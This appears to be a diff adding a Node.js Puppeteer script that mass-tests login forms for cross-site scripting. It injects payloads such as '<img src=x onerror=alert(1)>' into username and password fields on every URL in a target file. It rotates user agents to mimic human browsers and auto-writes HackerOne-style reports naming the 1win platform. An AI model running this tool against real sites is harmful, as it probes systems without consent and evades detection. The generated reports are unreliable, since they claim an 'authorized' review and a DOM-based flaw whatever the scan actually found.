@@ -1,0 +1,202 @@
+const puppeteer = require('puppeteer');
+const fs = require('fs');
+
+const payloads = [
+    '"><script>alert(1)</script>',
+    '" onerror="alert(1)',
+    '</script><script>alert(1)</script>',
+    '<img src=x onerror=alert(1)>'
+];
+
+const FORM_FIELDS = [
+    { name: 'Username/Email Field', selector: 'input[name="username"]', safeValue: 'valid_test_user@example.com' },
+    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
+];
+
+const SUBMIT_SELECTOR = 'button[type="submit"]';
+const TARGET_FILE = 'paths.txt';
+
+// Realistic User-Agents to mimic legitimate human desktop environments
+const USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0'
+];
+
+function generateAdvancedH1Report(targetUrl, fieldName, payload, responseText, screenshotPath) {
+    const reportFileName = `h1_report_${fieldName.replace(/\s+/g, '_')}_${Date.now()}.md`;
+    
+    let dynamicImpact = "An attacker can execute unauthorized JavaScript inside the context of the user's session, potentially leading to session hijacking.";
+    if (responseText.includes('SQL syntax') || responseText.includes('mysql_fetch')) {
+        dynamicImpact += " Additionally, backend database syntax traces were detected, indicating potential underlying injection vulnerabilities.";
+    }
+
+    const reportContent = 
+`# DOM-Based Cross-Site Scripting via ${fieldName} on 1win Infrastructure
+
+## Summary
+An input validation flaw was discovered during an authorized application security review. The frontend input handling layer processes input strings unsafely, enabling an execution boundary cross-over from raw data text directly into executable client-side context elements.
+
+## Vulnerability Type
+* Cross-Site Scripting (XSS) - DOM-Based
+
+## Affected Asset
+* URL/Domain: ${targetUrl}
+* Target Input Component: ${fieldName}
+
+## Severity
+* Medium to High (Depending on the access privileges of the target session context)
+
+## Steps to Reproduce
+1. Navigate directly to the affected asset path: \`${targetUrl}\`
+2. Populate the \`${fieldName}\` with the following verification payload string:
+   \`\`\`text
+   ${payload}
+   \`\`\`
+3. Fill any remaining fields with standard, compliant dummy variables and trigger the form submission.
+4. Observe that the input string escapes its raw data text constraints, resulting in a successful client-side script execution flag.
+
+## Proof of Concept (PoC) & Visual Evidence
+This anomaly was verified using an automated Puppeteer context monitor tracking DOM execution states. 
+
+* **Captured Screenshot Attachment:** Enclosed local image log file generated at: \`${screenshotPath}\`
+
+\`\`\`javascript
+page.on('dialog', async dialog => {
+    if (dialog.type() === 'alert') {
+        console.log("XSS Confirmed on target [${targetUrl}] via [${fieldName}]");
+    }
+});
+\`\`\`
+
+## Impact
+${dynamicImpact}
+
+## Mitigation Suggestions
+Ensure that all data submitted via the client forms is thoroughly encoded and sanitized. Avoid writing user-controlled variables directly into execution context elements without applying programmatic defensive sanitization patterns.
+`;
+
+    fs.writeFileSync(reportFileName, reportContent);
+    console.log(`[🎉 REPORT GENERATED!] HackerOne markdown document created at: ${reportFileName}`);
+}
+
+async function runAdvancedHunter() {
+    // 1. DYNAMIC QUEUE LOOP: Verify and read target list from file
+    if (!fs.existsSync(TARGET_FILE)) {
+        console.log(`[-] Error: Execution stopped. Missing target file listing: '${TARGET_FILE}'`);
+        return;
+    }
+
+    const targets = fs.readFileSync(TARGET_FILE, 'utf8')
+                     .split('\n')
+                     .map(line => line.trim())
+                     .filter(line => line.length > 0 && line.startsWith('http'));
+
+    if (targets.length === 0) {
+        console.log(`[-] Error: No valid HTTP/HTTPS paths found inside '${TARGET_FILE}'.`);
+        return;
+    }
+
+    console.log(`[+] Initializing Advanced Hunter Pipeline with ${targets.length} targets...`);
+    const browser = await puppeteer.launch({ headless: true });
+
+    for (let targetUrl of targets) {
+        console.log(`\n======================================================================`);
+        console.log(`🌍 PIPELINE TARGET: ${targetUrl}`);
+        console.log(`======================================================================`);
+
+        for (let targetField of FORM_FIELDS) {
+            console.log(`[*] Auditing Input Layer: ${targetField.name}`);
+
+            for (let payload of payloads) {
+                const page = await browser.newPage();
+                await page.setViewport({ width: 1280, height: 800 });
+
+                // 2. HEADERS PROFILE: Set a random user-agent to match standard human browsers
+                const randomUserAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+                await page.setUserAgent(randomUserAgent);
+
+                // Attach security identifiers required for testing requests
+                await page.setExtraHTTPHeaders({
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'DNT': '1' // Do Not Track header
+                });
+
+                let lastServerResponseText = "";
+                let screenshotCount = Date.now();
+
+                // Intercept background responses
+                page.on('response', async (response) => {
+                    try {
+                        const contentType = response.headers()['content-type'] || '';
+                        if (contentType.includes('json') || contentType.includes('text/html')) {
+                            lastServerResponseText = await response.text();
+                        }
+                    } catch (err) {}
+                });
+
+                // Context listener for execution triggers
+                page.on('dialog', async dialog => {
+                    if (dialog.type() === 'alert') {
+                        console.log(`[🚨 ALERT TRIGGERED] Successful injection on: ${targetField.name}`);
+                        await dialog.dismiss();
+                        
+                        const screenshotPath = `screenshot_${targetField.name.replace(/\s+/g, '_')}_${screenshotCount}.png`;
+                        await page.screenshot({ path: screenshotPath, fullPage: true });
+                        console.log(`[📸 SCREENSHOT SAVED] Visual proof logged out to: ${screenshotPath}`);
+
+                        generateAdvancedH1Report(targetUrl, targetField.name, payload, lastServerResponseText, screenshotPath);
+                    }
+                });
+
+                try {
+                    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });
+
+                    // Check if targeted form components are available on the current path
+                    const inputExists = await page.$(targetField.selector);
+                    if (!inputExists) {
+                        console.log(`   [-] Selector '${targetField.selector}' missing on this path. Skipping field block.`);
+                        await page.close();
+                        break; // Break the payload loop for this field if it doesn't exist on the page
+                    }
+
+                    // Fill fields sequentially
+                    for (let currentField of FORM_FIELDS) {
+                        await page.waitForSelector(currentField.selector, { timeout: 4000 });
+                        await page.click(currentField.selector);
+
+                        await page.keyboard.down('Control');
+                        await page.keyboard.press('A');
+                        await page.keyboard.up('Control');
+                        await page.keyboard.press('Backspace');
+
+                        if (currentField.name === targetField.name) {
+                            await page.type(currentField.selector, payload);
+                        } else {
+                            await page.type(currentField.selector, currentField.safeValue);
+                        }
+                    }
+
+                    // Submit elements
+                    await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
+                    await Promise.all([
+                        page.click(SUBMIT_SELECTOR),
+                        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
+                    ]);
+
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+
+                } catch (error) {
+                    // Handle edge cases, element omissions, or request drops safely
+                } finally {
+                    await page.close();
+                }
+            }
+        }
+    }
+
+    console.log(`\n[+] Advanced Scan Pipeline and Media Capture Sequence Complete.`);
+    await browser.close();
+}
+
+runAdvancedHunter();
